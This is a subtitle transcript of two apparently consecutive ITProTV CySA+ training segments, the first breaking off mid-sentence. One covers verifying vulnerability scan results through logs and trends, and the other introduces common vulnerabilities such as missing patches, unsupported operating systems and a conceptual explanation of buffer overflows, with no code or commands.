water.\n\n401\n00:19:36.000 --> 00:19:37.200\n&gt;&gt; Right.\n&gt;&gt; Right.\n\n402\n00:19:37.200 --> 00:19:38.743\nThat's the problem.\n&gt;&gt; And they loose data too,\n\n403\n00:19:38.743 --> 00:19:40.630\nright?\n&gt;&gt; Not necessarily loose data,\n\n404\n00:19:40.630 --> 00:19:46.000\nbut you turn off a critical\ninfrastructure, and that's unacceptable.\n\n405\n00:19:46.000 --> 00:19:46.980\nYou might as well have\n\n406\n00:19:46.980 --> 00:19:49.150\nterrorist attacked yourself at that point.\n&gt;&gt; Goodness.\n\n407\n00:19:49.150 --> 00:19:50.490\n&gt;&gt; Right, so what do you do?\n\n408\n00:19:50.490 --> 00:19:51.810\n&gt;&gt; Well I've gotta exclude that and\n\n409\n00:19:51.810 --> 00:19:54.620\nI just gotta keep running it until\nwe figure something else, right?\n\n410\n00:19:54.620 --> 00:19:55.280\nSo these things do,\n\n411\n00:19:55.280 --> 00:19:58.130\nwe have compensating controls that\ncome into play that help with that.\n\n412\n00:19:58.130 --> 00:20:01.680\nBut what are you gonna do,\nall right, let's move on.\n\n413\n00:20:01.680 --> 00:20:07.300\nLike I said, remove exceptions if\npossible, and prioritize response actions.\n\n414\n00:20:07.300 --> 00:20:08.227\nJust make sure,\n\n415\n00:20:08.227 --> 00:20:10.960\nwe've walked through that a little bit.\n&gt;&gt; Right.\n\n416\n00:20:10.960 --> 00:20:14.000\n&gt;&gt; Prioritize things if I know\n\n417\n00:20:14.000 --> 00:20:17.580\nthat that's running that version,\nthe NT 4.0.\n\n418\n00:20:17.580 --> 00:20:22.110\nYes it is happening, it's a problem, but\nit's not high on the priority list because\n\n419\n00:20:22.110 --> 00:20:24.620\na, we've done other compensating\ncontrols to mitigate for\n\n420\n00:20:24.620 --> 00:20:28.520\nthat, and\nI can get to that down the road, we will\n\n421\n00:20:28.520 --> 00:20:31.880\nhave to get to that later because I got\nmore pressing things, so prioritization.\n\n422\n00:20:34.440 --> 00:20:35.260\nWhat else do we need to do?\n\n423\n00:20:35.260 --> 00:20:36.840\nCorrelated other data points.\n\n424\n00:20:36.840 --> 00:20:42.170\nWe can use other things, best practices,\nmake sure that the scans are looking, when\n\n425\n00:20:42.170 --> 00:20:47.630\nyou look at your best practices, and you\nsee your scan, does it correlate to that?\n\n426\n00:20:47.630 --> 00:20:49.000\nDoes that happen?\n\n427\n00:20:49.000 --> 00:20:55.000\nSo what I mean is, if your best practices\nis to not be running FTP service,\n\n428\n00:20:55.000 --> 00:20:56.680\nbut you use a secure FTP.\n\n429\n00:20:56.680 --> 00:21:01.270\nWhen I run my scan,\ndo I see FTP on my network?\n\n430\n00:21:01.270 --> 00:21:03.210\nOr do I see secure FTP?\n\n431\n00:21:03.210 --> 00:21:07.306\nSo there's me following regulations or\ncompany policy, best practices,\n\n432\n00:21:07.306 --> 00:21:08.846\nall that kind of that stuff.\n\n433\n00:21:08.846 --> 00:21:10.830\nWanna make sure all\nthat stuff is lined up.\n\n434\n00:21:10.830 --> 00:21:13.310\nAnd if you use those regulatory systems,\nor\n\n435\n00:21:13.310 --> 00:21:17.450\nthose company policies that have been put\nin place, to verify that that's happening,\n\n436\n00:21:17.450 --> 00:21:20.130\nthat's just part of\nthe verification process.\n\n437\n00:21:20.130 --> 00:21:25.790\nAnd then reconcile results,\nuse other sources to verify,\n\n438\n00:21:25.790 --> 00:21:28.360\nit's another way to verify basically.\n\n439\n00:21:28.360 --> 00:21:32.580\nIf I look at my seam system,\nand I'm looking at the logs and\n\n440\n00:21:32.580 --> 00:21:37.780\nI see, yup,\nthere's the SFTP.2.2.4 traffic happening.\n\n441\n00:21:37.780 --> 00:21:40.590\nAnd I see a lot of people doing things,\n\n442\n00:21:40.590 --> 00:21:45.840\nlike sending these weird characters\nthat give it exploit capability, right?\n\n443\n00:21:45.840 --> 00:21:49.870\nLook at those logs, look for\npeople accessing and\n\n444\n00:21:49.870 --> 00:21:52.960\nbeing authorized to access\nthings in weird ways.\n\n445\n00:21:52.960 --> 00:21:56.100\nSo that can bolster up the fact\nthat the vulnerability scan\n\n446\n00:21:56.100 --> 00:21:57.330\nfound this as a problem.\n\n447\n00:21:57.330 --> 00:21:59.590\nAnd I'm seeing it happen\nin the real world.\n\n448\n00:21:59.590 --> 00:22:04.090\nOr maybe my logs tell me\nthe version that I'm using and\n\n449\n00:22:04.090 --> 00:22:06.470\nI can look at the logs and see versioning,\n\n450\n00:22:06.470 --> 00:22:11.420\nI can see patches that were applied due to\napplication logs, things of that nature.\n\n451\n00:22:11.420 --> 00:22:14.510\nInstallation logs, look through\nall the different logs of your,\n\n452\n00:22:14.510 --> 00:22:18.300\nobviously syslogs full of a bunch\nof excellent information.\n\n453\n00:22:18.300 --> 00:22:20.230\nGo there, things of that nature.\n\n454\n00:22:20.230 --> 00:22:22.060\nLet's see here, what else?\n\n455\n00:22:22.060 --> 00:22:24.430\nAny other monitoring systems\nthat you might have in play,\n\n456\n00:22:24.430 --> 00:22:27.610\nsuch as log systems,\nwe talked about seams,\n\n457\n00:22:27.610 --> 00:22:31.220\nconfiguration management systems\nif you have those in place.\n\n458\n00:22:31.220 --> 00:22:33.600\nUse every tool that you\nhave at your available,\n\n459\n00:22:33.600 --> 00:22:36.140\nanything that's especially\ndoing monitoring or logging\n\n460\n00:22:36.140 --> 00:22:40.360\ncan be super helpful in the verification\nof the vulnerability scan itself.\n\n461\n00:22:40.360 --> 00:22:46.350\nAnd then, lastly, you can use this\ninformation to determine trends.\n\n462\n00:22:46.350 --> 00:22:47.930\nNot so much where you are now, but\n\n463\n00:22:47.930 --> 00:22:52.940\nwhere might you need to be down the road,\nat some length of time.\n\n464\n00:22:52.940 --> 00:22:58.600\nAnd what I mean is, take a look at\nwhat's being exploited right now, right?\n\n465\n00:22:58.600 --> 00:23:02.060\nAnd you say, okay I'm looking at all\nthe vulnerabilities that I have.\n\n466\n00:23:02.060 --> 00:23:04.450\nI'm looking at\nvulnerabilities that are hot,\n\n467\n00:23:04.450 --> 00:23:06.570\nbecause we asked security professionals.\n\n468\n00:23:06.570 --> 00:23:10.570\nWe should be following\nsecurity newsfeeds and\n\n469\n00:23:10.570 --> 00:23:15.530\nstaying on top of what is happening in the\nsecurity realm, that's part of our job.\n\n470\n00:23:15.530 --> 00:23:20.910\nAnd if you start seeing I push for,\nI don't know,\n\n471\n00:23:20.910 --> 00:23:24.420\nremote code execution,\nSQL injection, cross-site scripting.\n\n472\n00:23:24.420 --> 00:23:26.170\nI mean cross-site scripting\nis super hot right now.\n\n473\n00:23:27.220 --> 00:23:32.920\nCheck and\nsee have we made account for that.\n\n474\n00:23:32.920 --> 00:23:35.810\nI'm seeing more and\nmore cross-site scripting attacks.\n\n475\n00:23:35.810 --> 00:23:38.930\nWe really need to start looking even\nthough they are not showing up on our\n\n476\n00:23:38.930 --> 00:23:41.710\nscanners as maybe critical at this point.\n\n477\n00:23:41.710 --> 00:23:46.700\nMaybe down the road they will be because\nof the attacks that are starting to\n\n478\n00:23:46.700 --> 00:23:50.500\nbecome available to\nthe community at large.\n\n479\n00:23:50.500 --> 00:23:52.290\nSo start looking for those trends and\n\n480\n00:23:52.290 --> 00:23:57.762\nthen look at your scans to see if\nyou can basically follow and see.\n\n481\n00:23:57.762 --> 00:24:01.771\nAre we going to be vulnerable to that\ndown the road, so let's go ahead and\n\n482\n00:24:01.771 --> 00:24:04.750\nstart the mitigation of that\nnow before we get there.\n\n483\n00:24:04.750 --> 00:24:08.280\nLet's go ahead and get ahead of things\nwhile we're behind the eight ball.\n\n484\n00:24:08.280 --> 00:24:13.460\nAs far as anything else goes I\nthink that is about all I have for\n\n485\n00:24:13.460 --> 00:24:17.590\nyou guys, as far as following\nthe vulnerability scanner and\n\n486\n00:24:17.590 --> 00:24:21.460\nsay hey, what you told me,\nis that true or not true?\n\n487\n00:24:21.460 --> 00:24:25.020\nI think we've shown you a good\ndemonstration of how that works out\n\n488\n00:24:25.020 --> 00:24:28.975\npractically, and\nthat's about all I've got for you today\n\n489\n00:24:28.975 --> 00:24:29.971\n&gt;&gt; Trust but verify,\n\n490\n00:24:29.971 --> 00:24:31.719\nscanned results verification.\n\n491\n00:24:31.719 --> 00:24:33.265\nExcellent episode, thank you Daniel.\n\n492\n00:24:33.265 --> 00:24:36.465\nAnd before we move on, anything else?\n&gt;&gt; No Zach, I think that's about it.\n\n493\n00:24:36.465 --> 00:24:38.565\nJust make sure you're\nfollowing these things down.\n\n494\n00:24:38.565 --> 00:24:39.515\nGo through the list.\n\n495\n00:24:39.515 --> 00:24:43.975\nLeave no stone unturned as we like to,\nin tongue in cheek, say here in ITProTV.\n\n496\n00:24:43.975 --> 00:24:45.025\nThat's about it.\n\n497\n00:24:45.025 --> 00:24:47.900\nYou just want to verify that these\nthings are what they say they are.\n\n498\n00:24:47.900 --> 00:24:49.090\n&gt;&gt; And verify this,\n\n499\n00:24:49.090 --> 00:24:51.180\nmake sure you watch\nevery episode of CySa+.\n\n500\n00:24:51.180 --> 00:24:54.140\nDaniel's done a marvelous job, putting\ntogether a lot of great information for\n\n501\n00:24:54.140 --> 00:24:56.820\nyou that you can use today and\ntomorrow, and, by the way.\n\n502\n00:24:56.820 --> 00:25:00.090\nyou'll be in the course library, there's\nthousands of other hours of content\n\n503\n00:25:00.090 --> 00:25:03.130\nthat's there to help you go further,\nso check that out, too, and\n\n504\n00:25:03.130 --> 00:25:05.350\ntell everybody you know about ITProTV.\n\n505\n00:25:05.350 --> 00:25:06.490\nITProTV is binge worthy.\n\n506\n00:25:06.490 --> 00:25:07.470\nThanks for watching.\n\n507\n00:25:07.470 --> 00:25:08.960\nI'm

[CROSSTALK]\n\n3\n00:00:06.346 --> 00:00:08.235\n[MUSIC]\n\n4\n00:00:08.235 --> 00:00:12.997\n&gt;&gt; You're watching ITProTV.\n&gt;&gt; Hello, and thank you for\n\n5\n00:00:12.997 --> 00:00:13.840\nwatching ITProTV.\n\n6\n00:00:13.840 --> 00:00:15.800\nHelping you learn everywhere you go.\n\n7\n00:00:15.800 --> 00:00:18.790\nI'm your host, Zach Memos,\nfor this episode of CySA+.\n\n8\n00:00:18.790 --> 00:00:21.600\nCommon Vulnerabilities is\nthe title of this episode, and\n\n9\n00:00:21.600 --> 00:00:24.840\nwe're gonna find out what that all means\nbecause Daniel Lowrie is here to tell us,\n\n10\n00:00:24.840 --> 00:00:26.776\naren't you Daniel?\n&gt;&gt; I'm gonna do my best, Zach.\n\n11\n00:00:26.776 --> 00:00:30.545\nI'm so glad to be back on the show\nhere with you good folks, as always.\n\n12\n00:00:30.545 --> 00:00:33.200\nHere to learn some more\nabout the CySA+ exam.\n\n13\n00:00:33.200 --> 00:00:35.950\nAnd today, we're looking at\nthe common vulnerabilities.\n\n14\n00:00:35.950 --> 00:00:39.500\nWhat are some of the vulnerabilities\nthat I've run scans with?\n\n15\n00:00:39.500 --> 00:00:41.390\nWhat is a buffer overflow?\n\n16\n00:00:41.390 --> 00:00:43.680\nWhat is this privilege\nescalation thing of which it\n\n17\n00:00:43.680 --> 00:00:44.663\nspeaks?\n&gt;&gt; [LAUGH]\n\n18\n00:00:44.663 --> 00:00:46.689\n&gt;&gt; We're just gonna kinda go over some\n\n19\n00:00:46.689 --> 00:00:49.661\nof the general idea of these\ncommon vulnerabilities\n\n20\n00:00:49.661 --> 00:00:54.537\nthat you'll see in different areas of your\nenvironments and how they might work out.\n\n21\n00:00:54.537 --> 00:01:00.471\nAnd even do some demonstrating of how\nto exploit those vulnerabilities.\n\n22\n00:01:00.471 --> 00:01:02.396\n&gt;&gt; You guys can just get a feel for\n\n23\n00:01:02.396 --> 00:01:06.556\nwhat that looks like in practicality\nwhen you come across them.\n\n24\n00:01:06.556 --> 00:01:09.890\nSo that's what we're gonna tackle today,\nchecking out those common vulnerabilities.\n\n25\n00:01:09.890 --> 00:01:10.960\n&gt;&gt; And that'll be important,\n\n26\n00:01:10.960 --> 00:01:11.980\nmight be on the exam, too.\n\n27\n00:01:11.980 --> 00:01:14.565\nThey might actually call out,\nwhat are some common vulnerabilities,\n\n28\n00:01:14.565 --> 00:01:16.290\nright?\n&gt;&gt; You make great points there,\n\n29\n00:01:16.290 --> 00:01:16.889\nZach.\n&gt;&gt; [LAUGH]\n\n30\n00:01:16.889 --> 00:01:18.385\n&gt;&gt; They might want to,\n\n31\n00:01:18.385 --> 00:01:22.610\nif you were to take a survey\non common vulnerabilities and\n\n32\n00:01:22.610 --> 00:01:26.050\nanswer some questions\nabout different ones.\n\n33\n00:01:26.050 --> 00:01:28.400\nMaybe somebody asked you\nwhat is a buffer overflow?\n\n34\n00:01:28.400 --> 00:01:30.316\nYou would want to be able\nto answer that question.\n\n35\n00:01:30.316 --> 00:01:35.272\nOr, if they kinda did the reverse thing,\nlike this is happening, what is that?\n\n36\n00:01:35.272 --> 00:01:36.860\nWell, it's a buffer overflow.\n\n37\n00:01:36.860 --> 00:01:40.622\nSo kind of a Jeopardy answer\nkinda thing going on.\n\n38\n00:01:40.622 --> 00:01:41.890\nExactly, so\nthat's what we're gonna look at.\n\n39\n00:01:41.890 --> 00:01:46.620\nSo let's start with the server\ncommon vulnerability, servers and\n\n40\n00:01:46.620 --> 00:01:47.620\nendpoints, okay?\n\n41\n00:01:47.620 --> 00:01:49.840\nGotta have our servers.\n\n42\n00:01:49.840 --> 00:01:51.830\nCan't live our life without them,\nit would just be a bad,\n\n43\n00:01:51.830 --> 00:01:52.980\nbad day.\n&gt;&gt; Bad day.\n\n44\n00:01:52.980 --> 00:01:54.190\n&gt;&gt; Zach, I know you love your server so\n\n45\n00:01:54.190 --> 00:01:55.220\nmuch.\n&gt;&gt; I love the Cisco.\n\n46\n00:01:55.220 --> 00:01:56.790\n&gt;&gt; He hugs it, he lifts it.\n\n47\n00:01:56.790 --> 00:01:57.820\n&gt;&gt; Every morning.\n\n48\n00:01:57.820 --> 00:02:00.800\nI give it a nice kiss [CROSSTALK]\n&gt;&gt; Cisco, well, I guess they have servers.\n\n49\n00:02:00.800 --> 00:02:04.990\nThey got the source fire and\nall the fire power and wackity boo.\n\n50\n00:02:04.990 --> 00:02:06.510\nThat's crazy stuff.\n&gt;&gt; Wackity boo, yeah,\n\n51\n00:02:06.510 --> 00:02:09.920\nthe wackity boo, there you go.\n&gt;&gt; It's fun, Cisco has a good time.\n\n52\n00:02:09.920 --> 00:02:12.940\nBut our servers, this is typically\nlike I'm running a web server,\n\n53\n00:02:12.940 --> 00:02:15.030\nI'm running an FTP server,\nI'm running an SSH server.\n\n54\n00:02:15.030 --> 00:02:20.430\nI'm running these different network\nservices that allow me to do something.\n\n55\n00:02:20.430 --> 00:02:23.830\nOr I'm on a workstation, I'm on\nan endpoint somewhere, doing my job.\n\n56\n00:02:23.830 --> 00:02:28.030\nWhat are some of the common\nvulnerabilities that I might encounter\n\n57\n00:02:28.030 --> 00:02:29.770\nat my end point, or at my server level?\n\n58\n00:02:29.770 --> 00:02:31.160\nThat's what we're gonna start with.\n\n59\n00:02:31.160 --> 00:02:32.750\nSo let's start with missing patches,\n\n60\n00:02:32.750 --> 00:02:37.540\nprobably the biggest, if you guys\ntake anything away from this series,\n\n61\n00:02:37.540 --> 00:02:43.830\nit is create a regular patching\ncycle in which you patch machines.\n\n62\n00:02:43.830 --> 00:02:49.280\nBecause, I dare you right now,\nanyone pause the video,\n\n63\n00:02:49.280 --> 00:02:56.440\njump to Google, Bing, whatever, and type\nin security blog, computer security blog.\n\n64\n00:02:56.440 --> 00:03:00.540\nGo to one, and look at the news\nfeed at what the latest security\n\n65\n00:03:00.540 --> 00:03:03.655\nproblems that are happening now, or just\nthe news, just whatever's in the news.\n\n66\n00:03:03.655 --> 00:03:08.525\nI would almost guarantee one of them\nis there was an exploit, data breach,\n\n67\n00:03:08.525 --> 00:03:10.260\nat xyz company.\n\n68\n00:03:10.260 --> 00:03:11.413\nWhy was there a data breach?\n\n69\n00:03:11.413 --> 00:03:16.120\nBecause attackers found\na vulnerability in their\n\n70\n00:03:16.120 --> 00:03:20.490\nsystem that allowed them\nto gain access to data.\n\n71\n00:03:20.490 --> 00:03:25.280\nAnd hey, this vulnerability\nwas actually discovered,\n\n72\n00:03:25.280 --> 00:03:28.583\nthe CVE is CVE-2014-0973.\n\n73\n00:03:28.583 --> 00:03:33.204\nI'm making that up, but\n2017, that was last year.\n\n74\n00:03:33.204 --> 00:03:35.018\nWhat do you mean?\n\n75\n00:03:35.018 --> 00:03:37.470\nSo that means this vulnerability\nhas been around for a year.\n\n76\n00:03:40.160 --> 00:03:41.280\nDing, ding, ding.\n\n77\n00:03:41.280 --> 00:03:43.750\nWell, how were they able to exploit it?\n\n78\n00:03:43.750 --> 00:03:47.260\nBecause you're not patching your system,\nthat's why.\n\n79\n00:03:47.260 --> 00:03:50.310\nSo to think, well,\nthat's kinda kiddie stuff, right?\n\n80\n00:03:50.310 --> 00:03:51.730\nYeah, everybody knows you've gotta patch.\n\n81\n00:03:51.730 --> 00:03:56.330\nIt's more often than not,\nnot getting done, to be honest with you.\n\n82\n00:03:56.330 --> 00:03:59.310\nI know some guys that\ndo penetration testing.\n\n83\n00:03:59.310 --> 00:04:04.280\nThey say one of the most common\ninroads into a system is that they\n\n84\n00:04:04.280 --> 00:04:09.620\nhadn't patched something, and\njust leaves you completely exposed.\n\n85\n00:04:09.620 --> 00:04:12.740\nSo make sure that you are patching, and\n\n86\n00:04:12.740 --> 00:04:16.430\nthat these systems are as up\nto date as they possibly can.\n\n87\n00:04:16.430 --> 00:04:18.200\nThere's always exceptions to the rule.\n\n88\n00:04:18.200 --> 00:04:22.250\nBut if you can,\nmake sure that they have the latest and\n\n89\n00:04:22.250 --> 00:04:25.864\ngreatest patches as soon\nas humanly possible.\n\n90\n00:04:25.864 --> 00:04:30.298\nAll right,\nkind of along the same line is unsupported\n\n91\n00:04:30.298 --> 00:04:35.370\noperating systems or applications.\n&gt;&gt; Makes sense.\n\n92\n00:04:35.370 --> 00:04:37.220\n&gt;&gt; These things happen.\n\n93\n00:04:37.220 --> 00:04:38.660\nGuess what?\n\n94\n00:04:38.660 --> 00:04:41.460\nWe've mentioned in a couple of shows\n\n95\n00:04:41.460 --> 00:04:44.920\nnow about the guy that I met at\nRSA who had the heart monitor.\n\n96\n00:04:44.920 --> 00:04:47.890\nAnd inside of that heart monitor,\nrunning the heart monitor itself,\n\n97\n00:04:47.890 --> 00:04:51.210\nthe operating system was Linux.\n\n98\n00:04:51.210 --> 00:04:52.430\nBut it was a very old, or\n\n99\n00:04:52.430 --> 00:04:56.990\nat least an old enough version of\nLinux that it is vulnerable to attack.\n\n100\n00:04:56.990 --> 00:05:00.935\nThere's a known vulnerability to\nthat specific version of Linux,\n\n101\n00:05:00.935 --> 00:05:01.865\nwhich is no longer supported.\n\n102\n00:05:01.865 --> 00:05:04.695\nAnd we're not just picking on Linux here.\n\n103\n00:05:04.695 --> 00:05:06.595\nThis could be Windows XP, anyone?\n\n104\n00:05:06.595 --> 00:05:09.945\nAnd you think no one runs Windows XP.\n&gt;&gt; Vista, yeah.\n\n105\n00:05:09.945 --> 00:05:10.670\n&gt;&gt; Vista, right?\n\n106\n00:05:10.670 --> 00:05:12.700\nzach, how many people do you know that run\n\n107\n00:05:12.700 --> 00:05:13.955\nWindows XP?\n\n108\n00:05:13.955 --> 00:05:14.775\n&gt;&gt; None.\n&gt;&gt; None.\n\n109\n00:05:14.775 --> 00:05:15.555\n&gt;&gt; Absolutely none.\n\n110\n00:05:15.555 --> 00:05:16.285\n&gt;&gt; Right, so\n\n111\n00:05:16.285 --> 00:05:20.095\nin your mind, what is the attack\nservice of the Windows XP environment?\n\n112\n00:05:20.095 --> 00:05:21.720\n&gt;&gt; I would say it would be pretty broad.\n\n113\n00:05:21.720 --> 00:05:23.750\n&gt;&gt; Pretty low, right?\n\n114\n00:05:23.750 --> 00:05:25.250\nThere wouldn't be a lot cuz\nhe doesn't know anybody.\n\n115\n00:05:25.250 --> 00:05:28.150\nI don't know anyone around Windows XP.\n&gt;&gt; We're doing\n\n116\n00:05:28.150 --> 00:05:29.450\nthe reverse thing again.\n&gt;&gt; Right.\n\n117\n00:05:29.450 --> 00:05:31.550\nHow many people do you know that run-\n&gt;&gt; It's the reverse psychology.\n\n118\n00:05:31.550 --> 00:05:33.572\n[LAUGH]\n&gt;&gt; If there aren't many people,\n\n119\n00:05:33.572 --> 00:05:36.286\nthen there must not be [CROSSTALK]\n&gt;&gt; Because there's not that many\n\n120\n00:05:36.286 --> 00:05:36.880\npeople running it.\n\n121\n00:05:36.880 --> 00:05:38.780\nThat's right.\n&gt;&gt; I don't have to worry about it, right?\n\n122\n00:05:39.995 --> 00:05:43.650\nAnd how many people that bought them,\nabout 10 or 50,000.\n\n123\n00:05:43.650 --> 00:05:45.200\n&gt;&gt; That's a few.\n\n124\n00:05:45.200 --> 00:05:46.278\n&gt;&gt; And guess who was running it?\n\n125\n00:05:46.278 --> 00:05:48.003\nThe government.\n\n126\n00:05:49.676 --> 00:05:51.147\nRight, so a big target,\nit was a big target.\n\n127\n00:05:51.147 --> 00:05:53.340\nHospitals were running it.\n\n128\n00:05:53.340 --> 00:05:54.950\nThis was a problem, right?\n\n129\n00:05:54.950 --> 00:05:58.944\nSo using old operating systems\nthat are no longer supported.\n\n130\n00:05:58.944 --> 00:06:01.150\nWindows XP is not supported\nby Microsoft anymore.\n\n131\n00:06:01.150 --> 00:06:04.568\nThat has end of life written\nall over it in red tape.\n\n132\n00:06:04.568 --> 00:06:07.305\n&gt;&gt; Listen I know you people love that\n\n133\n00:06:07.305 --> 00:06:08.420\nWindows.\n\n134\n00:06:08.420 --> 00:06:11.070\nI know, we hit a homerun with Windows XP,\nit was awesome.\n\n135\n00:06:11.070 --> 00:06:12.030\nBut it's time to move to the future.\n\n136\n00:06:12.030 --> 00:06:15.250\nThere are still, there are known\nissues with that Windows XP.\n\n137\n00:06:15.250 --> 00:06:18.000\nWe have to create new operating\nsystems and put them out.\n\n138\n00:06:18.000 --> 00:06:23.313\nHence, Windows 10, and 8, and 8.1, and 7,\nand Vista, and all the others in between.\n\n139\n00:06:23.313 --> 00:06:27.349\nNow, from Windows XP,\nwhy are you still running Windows,well,\n\n140\n00:06:27.349 --> 00:06:28.870\nwe just love it so much.\n&gt;&gt; [LAUGH]\n\n141\n00:06:28.870 --> 00:06:29.410\n&gt;&gt; Wrong.\n\n142\n00:06:29.410 --> 00:06:29.920\nWrong, wrong,\n\n143\n00:06:29.920 --> 00:06:32.710\nwrong.\nStart working toward getting away from\n\n144\n00:06:32.710 --> 00:06:36.670\nunsupported operating systems and\napplications.\n\n145\n00:06:36.670 --> 00:06:38.850\nIt falls under the same rule.\n&gt;&gt; Sure.\n\n146\n00:06:38.850 --> 00:06:40.630\n&gt;&gt; We saw that with the VSTP, right?\n\n147\n00:06:40.630 --> 00:06:43.700\nWe saw that that had\na backdoor vulnerability.\n\n148\n00:06:43.700 --> 00:06:44.890\nIt was an older version.\n\n149\n00:06:44.890 --> 00:06:46.430\nWhat was the vendor fix?\n\n150\n00:06:46.430 --> 00:06:48.160\nUpdate your version.\n\n151\n00:06:48.160 --> 00:06:50.780\nThat version is no longer\nsupported of that application.\n\n152\n00:06:50.780 --> 00:06:53.079\nGet the new version that doesn't\nhave the backdoor problem in it.\n\n153\n00:06:54.130 --> 00:06:56.238\nJust throwing that out there.\n\n154\n00:06:56.238 --> 00:06:57.817\nYou may want to.\n&gt;&gt; [LAUGH]\n\n155\n00:06:57.817 --> 00:06:58.560\n&gt;&gt; There you go.\n\n156\n00:06:58.560 --> 00:07:01.995\nAll right, so,\nlet's move into buffer overflows.\n\n157\n00:07:01.995 --> 00:07:03.920\nZach, are you familiar with\nbuffer overflows at all?\n\n158\n00:07:03.920 --> 00:07:06.150\nHave you ever heard of this term?\n&gt;&gt; I've heard of the term, and\n\n159\n00:07:06.150 --> 00:07:09.980\nit doesn't have to do with aspirin either.\n&gt;&gt; It does not have to do with aspirin.\n\n160\n00:07:09.980 --> 00:07:10.780\n&gt;&gt; No, it doesn't have to do with aspirin\n\n161\n00:07:10.780 --> 00:07:11.438\n[LAUGH].\n&gt;&gt; Zach just,\n\n162\n00:07:11.438 --> 00:07:13.070\nI see him in the corner from time to time,\n\n163\n00:07:13.070 --> 00:07:14.680\nhe's got a can of buffer and he's.\n&gt;&gt; [LAUGH]\n\n164\n00:07:14.680 --> 00:07:17.160\n&gt;&gt; It's overflowing out of his mouth, and\n\n165\n00:07:17.160 --> 00:07:18.850\nI'm like, no Zach!\n&gt;&gt; Don't do that buffer-\n\n166\n00:07:18.850 --> 00:07:19.940\n&gt;&gt; Don't do that, it's bad.\n\n167\n00:07:19.940 --> 00:07:23.680\nCrazy man.\nHe doesn't really do that, by the way.\n\n168\n00:07:23.680 --> 00:07:25.520\nBut what is a buffer overflow?\n\n169\n00:07:25.520 --> 00:07:26.450\nSo this is an attack.\n\n170\n00:07:26.450 --> 00:07:28.580\nIt's an interesting vulnerability that,\n\n171\n00:07:28.580 --> 00:07:33.465\nin some applications,\nyou're able to overflow the buffer.\n\n172\n00:07:33.465 --> 00:07:36.346\n[LAUGH] And there we go.\n&gt;&gt; You nailed it.\n\n173\n00:07:36.346 --> 00:07:37.240\n&gt;&gt; Yeah, nailed it.\n\n174\n00:07:37.240 --> 00:07:42.360\nWhat happens is sometimes you allocate\na specific portion of memory for\n\n175\n00:07:42.360 --> 00:07:44.500\ninput or other things, whatever.\n\n176\n00:07:44.500 --> 00:07:46.220\nYou just need a portion of\nmemory to do something.\n\n177\n00:07:46.220 --> 00:07:49.124\nTypically, this is done\nthrough inputs from the user.\n\n178\n00:07:49.124 --> 00:07:54.318\nSo if I need to take input from Zach to\nmy application and my application's gonna\n\n179\n00:07:54.318 --> 00:07:59.292\nask him something, and take that input so\nthat he can answer that question.\n\n180\n00:07:59.292 --> 00:08:04.950\nAnd then that's gonna be put into\na space of memory called a buffer okay?\n\n181\n00:08:04.950 --> 00:08:11.390\nWhen that happens, the application\nitself will then check that buffer for\n\n182\n00:08:11.390 --> 00:08:14.180\nwhatever disk it's got a bunch of\ninstructions that it runs through.\n\n183\n00:08:14.180 --> 00:08:17.050\nSometimes that instruction will be\nlook at this memory space which is\n\n184\n00:08:17.050 --> 00:08:19.800\nZach's buffer for\nthe input that he has given.\n\n185\n00:08:19.800 --> 00:08:20.980\nAnd use whatever's in there.\n\n186\n00:08:22.180 --> 00:08:22.730\nEasy peasy.\n\n187\n00:08:22.730 --> 00:08:26.070\nIt's basic programming logic, right?\n\n188\n00:08:26.070 --> 00:08:31.240\nHere's what happens is if it asks,\nuser, what is your name?\n\n189\n00:08:31.240 --> 00:08:32.780\nZach writes Zach, great.\n\n190\n00:08:32.780 --> 00:08:33.970\nPuts Zach in there.\n\n191\n00:08:33.970 --> 00:08:36.500\nPuts it in the memory buffer and\nthe program later down the road goes and\n\n192\n00:08:36.500 --> 00:08:40.170\nreaches into that memory buffer find out\nwhat the user's name is, and then we're\n\n193\n00:08:40.170 --> 00:08:45.330\ngoing to output that data or manipulate\nit in some way, do something with it.\n\n194\n00:08:45.330 --> 00:08:47.740\nWhat if Zack puts A?\n\n195\n00:08:49.550 --> 00:08:53.750\nAaaaaaaaaaaaa, right\nhow many As is like did\n\n196\n00:08:53.750 --> 00:08:58.504\nthe programmer actually think about that,\nwhat if\n\n197\n00:08:58.504 --> 00:09:03.360\nZach's name was 6,000 characters long?\n&gt;&gt; Goodness.\n\n198\n00:09:03.360 --> 00:09:04.950\n&gt;&gt; They didn't think about that, right?\n\n199\n00:09:04.950 --> 00:09:05.900\nAnd that's common.\n\n200\n00:09:05.900 --> 00:09:10.570\nThese things, sometimes they slip\nyour mind because you think, user,\n\n201\n00:09:10.570 --> 00:09:11.310\nwhat is your name?\n\n202\n00:09:11.310 --> 00:09:16.680\nWell, normal names are no longer than\nmaybe could be super generous and\n\n203\n00:09:16.680 --> 00:09:17.640\nsay 50 characters.\n\n204\n00:09:19.060 --> 00:09:22.620\nAnd even if it was, and\nI'm giving you a memory buffer size that\n\n205\n00:09:22.620 --> 00:09:26.230\ncan handle 1,000 characters if it were,\nbig deal.\n\n206\n00:09:26.230 --> 00:09:31.610\nYou've got plenty of room,\nso if your name is\n\n207\n00:09:31.610 --> 00:09:35.310\nwhich is an actual person I know.\n&gt;&gt; Yes, it's super long.\n\n208\n00:09:35.310 --> 00:09:36.640\nYou've got this super long,\nit doesn't matter.\n\n209\n00:09:36.640 --> 00:09:40.120\nYou've got plenty of buffer space in\nwhich to put those characters and\n\n210\n00:09:40.120 --> 00:09:41.700\nstore it.\n&gt;&gt; Makes sense, right?\n\n211\n00:09:41.700 --> 00:09:42.380\n&gt;&gt; Makes sense.\n\n212\n00:09:42.380 --> 00:09:47.640\nBut what happens if I\nfill the buffer up and\n\n213\n00:09:47.640 --> 00:09:51.120\nit then, what does it do?\n&gt;&gt; Overflows.\n\n214\n00:09:51.120 --> 00:09:52.080\n&gt;&gt; Right, it overflows.\n\n215\n00:09:52.080 --> 00:09:54.100\nSo, this is why it's\ncalled a buffer overflow.\n\n216\n00:09:54.100 --> 00:09:55.430\nYou've got that memory space.\n\n217\n00:09:55.430 --> 00:09:59.790\nZach has figured out that\nit can only handle 1,000\n\n218\n00:09:59.790 --> 00:10:01.960\ncharacters inside of that memory buffer.\n\n219\n00:10:03.350 --> 00:10:04.160\nSo, he sends 1,001.\n\n220\n00:10:04.160 --> 00:10:06.390\nWhere does it overflow to?\n\n221\n00:10:06.390 --> 00:10:10.070\nAnd we use decompilers, and\nI can kind of show you that.\n\n222\n00:10:10.070 --> 00:10:13.300\nLet me fire one up here just so\nyou can see what they look like.\n\n223\n00:10:13.300 --> 